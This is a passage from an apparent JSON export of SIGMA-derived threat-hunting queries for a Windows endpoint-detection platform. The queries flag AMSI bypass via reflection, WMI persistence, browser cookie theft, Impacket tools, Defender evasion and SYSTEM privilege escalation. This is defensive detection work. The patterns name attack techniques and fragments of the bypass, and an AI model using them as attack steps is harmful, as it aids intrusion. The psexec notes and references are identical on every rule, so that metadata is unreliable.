            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"new-object\" and tgt.process.cmdline contains \"text.encoding]::ascii\") and (tgt.process.cmdline contains \"system.io.compression.deflatestream\" or tgt.process.cmdline contains \"system.io.streamreader\" or tgt.process.cmdline contains \"readtoend(\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1091
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "This rule detects the execution of Run Once task as configured in the registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Run Once Task Execution as Configured in Registry",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\runonce.exe\" or tgt.process.displayName=\"Run Once Wrapper\") and (tgt.process.cmdline contains \"/AlternateShellStartup\" or tgt.process.cmdline contains \"/r\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1092
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1021"
            ],
            "name": "Remote PowerShell Session Host Process (WinRM)",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wsmprovhost.exe\" or src.process.image.path contains \"\\wsmprovhost.exe\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1093
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Rundll32 Activity Invoking Sys File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and (tgt.process.cmdline contains \".sys,\" or tgt.process.cmdline contains \".sys \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1094
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Potential AMSI Bypass Via .NET Reflection",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"System.Management.Automation.AmsiUtils\" and tgt.process.cmdline contains \"amsiInitFailed\") or (tgt.process.cmdline contains \"[Ref].Assembly.GetType\" and tgt.process.cmdline contains \"SetValue($null,$true)\" and tgt.process.cmdline contains \"NonPublic,Static\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1095
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMI script event consumers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "WMI Persistence - Script Event Consumer",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path=\"C:\\WINDOWS\\system32\\wbem\\scrcons.exe\" and src.process.image.path=\"C:\\Windows\\System32\\svchost.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1096
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1539",
                "t1005"
            ],
            "name": "SQLite Firefox Profile Data DB Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName=\"SQLite\" or (tgt.process.image.path contains \"\\sqlite.exe\" or tgt.process.image.path contains \"\\sqlite3.exe\")) and (tgt.process.cmdline contains \"cookies.sqlite\" or tgt.process.cmdline contains \"places.sqlite\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1097
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects chromium based browsers starting in headless and debugging mode and pointing to a user profile. This could be a sign of data stealing or remote control",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1185"
            ],
            "name": "Potential Data Stealing Via Chromium Headless Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"--remote-debugging-\" and tgt.process.cmdline contains \"--user-data-dir\" and tgt.process.cmdline contains \"--headless\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1098
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the SysInternals Procdump utility",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1003"
            ],
            "name": "Procdump Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\procdump.exe\" or tgt.process.image.path contains \"\\procdump64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1099
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious and uncommon child processes of WmiPrvSE",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1204",
                "t1218"
            ],
            "name": "Suspicious WmiPrvSE Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\wbem\\WmiPrvSE.exe\" and ((tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\verclsid.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"pwsh\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\"))) and (not (tgt.process.image.path contains \"\\WerFault.exe\" or tgt.process.image.path contains \"\\WmiPrvSE.exe\" or (tgt.process.image.path contains \"\\msiexec.exe\" and tgt.process.cmdline contains \"/i \")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1100
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of the Veeam service process. This could indicate potential RCE or SQL Injection.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Child Process Of Veeam Dabatase",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\sqlservr.exe\" and src.process.cmdline contains \"VEEAMSQL\") and (((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wsl.exe\" or tgt.process.image.path contains \"\\wt.exe\") and (tgt.process.cmdline contains \"-ex \" or tgt.process.cmdline contains \"bypass\" or tgt.process.cmdline contains \"cscript\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"http://\" or tgt.process.cmdline contains \"https://\" or tgt.process.cmdline contains \"mshta\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"copy \")) or (tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\tasklist.exe\" or tgt.process.image.path contains \"\\whoami.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1101
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of different compiled Windows binaries of the impacket toolset (based on names or part of their names - could lead to false positives)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "HackTool - Impacket Tools Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\goldenPac\" or tgt.process.image.path contains \"\\karmaSMB\" or tgt.process.image.path contains \"\\kintercept\" or tgt.process.image.path contains \"\\ntlmrelayx\" or tgt.process.image.path contains \"\\rpcdump\" or tgt.process.image.path contains \"\\samrdump\" or tgt.process.image.path contains \"\\secretsdump\" or tgt.process.image.path contains \"\\smbexec\" or tgt.process.image.path contains \"\\smbrelayx\" or tgt.process.image.path contains \"\\wmiexec\" or tgt.process.image.path contains \"\\wmipersist\") or (tgt.process.image.path contains \"\\atexec_windows.exe\" or tgt.process.image.path contains \"\\dcomexec_windows.exe\" or tgt.process.image.path contains \"\\dpapi_windows.exe\" or tgt.process.image.path contains \"\\findDelegation_windows.exe\" or tgt.process.image.path contains \"\\GetADUsers_windows.exe\" or tgt.process.image.path contains \"\\GetNPUsers_windows.exe\" or tgt.process.image.path contains \"\\getPac_windows.exe\" or tgt.process.image.path contains \"\\getST_windows.exe\" or tgt.process.image.path contains \"\\getTGT_windows.exe\" or tgt.process.image.path contains \"\\GetUserSPNs_windows.exe\" or tgt.process.image.path contains \"\\ifmap_windows.exe\" or tgt.process.image.path contains \"\\mimikatz_windows.exe\" or tgt.process.image.path contains \"\\netview_windows.exe\" or tgt.process.image.path contains \"\\nmapAnswerMachine_windows.exe\" or tgt.process.image.path contains \"\\opdump_windows.exe\" or tgt.process.image.path contains \"\\psexec_windows.exe\" or tgt.process.image.path contains \"\\rdp_check_windows.exe\" or tgt.process.image.path contains \"\\sambaPipe_windows.exe\" or tgt.process.image.path contains \"\\smbclient_windows.exe\" or tgt.process.image.path contains \"\\smbserver_windows.exe\" or tgt.process.image.path contains \"\\sniff_windows.exe\" or tgt.process.image.path contains \"\\sniffer_windows.exe\" or tgt.process.image.path contains \"\\split_windows.exe\" or tgt.process.image.path contains \"\\ticketer_windows.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1102
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of the filename DumpStack.log to evade Microsoft Defender",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "DumpStack.log Defender Evasion",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\DumpStack.log\" or tgt.process.cmdline contains \" -o DumpStack.log\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1103
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of DefenderCheck, a tool to evaluate the signatures used in Microsoft Defender. It can be used to figure out the strings / byte chains used in Microsoft Defender to detect a tool and thus used for AV evasion.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027"
            ],
            "name": "PUA - DefenderCheck Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\DefenderCheck.exe\" or tgt.process.displayName=\"DefenderCheck\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1104
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1587"
            ],
            "name": "Potential Privilege Escalation To LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -s cmd\" or tgt.process.cmdline contains \" /s cmd\" or tgt.process.cmdline contains \" \u2013s cmd\" or tgt.process.cmdline contains \" \u2014s cmd\" or tgt.process.cmdline contains \" \u2015s cmd\" or tgt.process.cmdline contains \" -s -i cmd\" or tgt.process.cmdline contains \" -s /i cmd\" or tgt.process.cmdline contains \" -s \u2013i cmd\" or tgt.process.cmdline contains \" -s \u2014i cmd\" or tgt.process.cmdline contains \" -s \u2015i cmd\" or tgt.process.cmdline contains \" /s -i cmd\" or tgt.process.cmdline contains \" /s /i cmd\" or tgt.process.cmdline contains \" /s \u2013i cmd\" or tgt.process.cmdline contains \" /s \u2014i cmd\" or tgt.process.cmdline contains \" /s \u2015i cmd\" or tgt.process.cmdline contains \" \u2013s -i cmd\" or tgt.process.cmdline contains \" \u2013s /i cmd\" or tgt.process.cmdline contains \" \u2013s \u2013i cmd\" or tgt.process.cmdline contains \" \u2013s \u2014i cmd\" or tgt.process.cmdline contains \" \u2013s \u2015i cmd\" or tgt.process.cmdline contains \" \u2014s -i cmd\" or tgt.process.cmdline contains \" \u2014s /i cmd\" or tgt.process.cmdline contains \" \u2014s \u2013i cmd\" or tgt.process.cmdline contains \" \u2014s \u2014i cmd\" or tgt.process.cmdline contains \" \u2014s \u2015i cmd\" or tgt.process.cmdline contains \" \u2015s -i cmd\" or tgt.process.cmdline contains \" \u2015s /i cmd\" or tgt.process.cmdline contains \" \u2015s \u2013i cmd\" or tgt.process.cmdline contains \" \u2015s \u2014i cmd\" or tgt.process.cmdline contains \" \u2015s \u2015i cmd\" or tgt.process.cmdline contains \" -i -s cmd\" or tgt.process.cmdline contains \" -i /s cmd\" or tgt.process.cmdline contains \" -i \u2013s cmd\" or tgt.process.cmdline contains \" -i \u2014s cmd\" or tgt.process.cmdline contains \" -i \u2015s cmd\" or tgt.process.cmdline contains \" /i -s cmd\" or tgt.process.cmdline contains \" /i /s cmd\" or tgt.process.cmdline contains \" /i \u2013s cmd\" or tgt.process.cmdline contains \" /i \u2014s cmd\" or tgt.process.cmdline contains \" /i \u2015s cmd\" or tgt.process.cmdline contains \" \u2013i -s cmd\" or tgt.process.cmdline contains \" \u2013i /s cmd\" or tgt.process.cmdline contains \" \u2013i \u2013s cmd\" or tgt.process.cmdline contains \" \u2013i \u2014s cmd\" or tgt.process.cmdline contains \" \u2013i \u2015s cmd\" or tgt.process.cmdline contains \" \u2014i -s cmd\" or tgt.process.cmdline contains \" \u2014i /s cmd\" or tgt.process.cmdline contains \" \u2014i \u2013s cmd\" or tgt.process.cmdline contains \" \u2014i \u2014s cmd\" or tgt.process.cmdline contains \" \u2014i \u2015s cmd\" or tgt.process.cmdline contains \" \u2015i -s cmd\" or tgt.process.cmdline contains \" \u2015i /s cmd\" or tgt.process.cmdline contains \" \u2015i \u2013s cmd\" or tgt.process.cmdline contains \" \u2015i \u2014s cmd\" or tgt.process.cmdline contains \" \u2015i \u2015s cmd\" or tgt.process.cmdline contains \" -s pwsh\" or tgt.process.cmdline contains \" /s pwsh\" or tgt.process.cmdline contains \" \u2013s pwsh\" or tgt.process.cmdline contains \" \u2014s pwsh\" or tgt.process.cmdline contains \" \u2015s pwsh\" or tgt.process.cmdline contains \" -s -i pwsh\" or tgt.process.cmdline contains \" -s /i pwsh\" or tgt.process.cmdline contains \" -s \u2013i pwsh\" or tgt.process.cmdline contains \" -s \u2014i pwsh\" or tgt.process.cmdline contains \" -s \u2015i pwsh\" or tgt.process.cmdline contains \" /s -i pwsh\" or tgt.process.cmdline contains \" /s /i pwsh\" or tgt.process.cmdline contains \" /s \u2013i pwsh\" or tgt.process.cmdline contains \" /s \u2014i pwsh\" or tgt.process.cmdline contains \" /s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2013s -i pwsh\" or tgt.process.cmdline contains \" \u2013s /i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2014i pwsh\" or tgt.process.cmdline contains \" \u2013s \u2015i pwsh\" or tgt.process.cmdline contains \" \u2014s -i pwsh\" or tgt.process.cmdline contains \" \u2014s /i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2013i pwsh\" or tgt.process.cmdline contains \" \u2014s \u2014i pwsh\" or 